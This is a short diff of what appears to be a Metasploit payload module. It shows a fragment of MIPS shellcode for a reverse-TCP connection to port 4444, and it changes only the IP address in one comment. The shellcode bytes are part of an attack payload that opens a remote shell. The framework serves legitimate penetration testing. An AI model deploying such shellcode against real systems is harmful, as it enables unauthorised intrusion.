@@ -59,7 +59,7 @@ module MetasploitModule
             "\x24\x0c\xff\xef" +  #  li  t4,-17
             "\x01\x80\x30\x27" +  #  nor a2,t4,zero
             "\x24\x02\x10\x4a" +  #  li  v0,4170
-            # connect(sockfd, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("192.168.172.1")}, 16)
+            # connect(sockfd, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("127.0.0.1")}, 16)
             "\x01\x01\x01\x0c" +  #  syscall 0x40404
             "\x00\x07\x80\x2a" +  #  slt s0,zero,a3
             "\x16\x00\x00\x25" +  #  bnez    s0,0x4006bc <failed>
